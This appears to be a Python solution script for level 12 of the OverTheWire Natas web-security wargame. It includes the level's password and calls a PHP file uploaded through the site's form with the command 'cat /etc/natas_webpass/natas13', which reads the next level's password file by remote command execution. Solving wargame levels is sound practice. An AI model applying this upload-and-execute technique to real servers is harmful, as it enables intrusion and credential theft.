#!/usr/bin/env python

import requests
import re
import urllib
import base64

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

#response = requests.get(url, auth = (username, password), headers = headers)
session = requests.Session()


#response = session.post(url, files ={"uploadedfile" : open('request.php', 'rb')}, data = {"filename" : "request.php", "MAX_FILE_SIZE" : "1000"}, auth = (username, password) )

response = session.get( url + 'upload/xvezuw29m1.php?c=cat /etc/natas_webpass/natas13', auth = (username, password))
content = response.text
#print base64.b64decode(urllib.unquote(session.cookies['data'])).encode('hex')
#print content
 
print re.findall('(.*)', content)[3]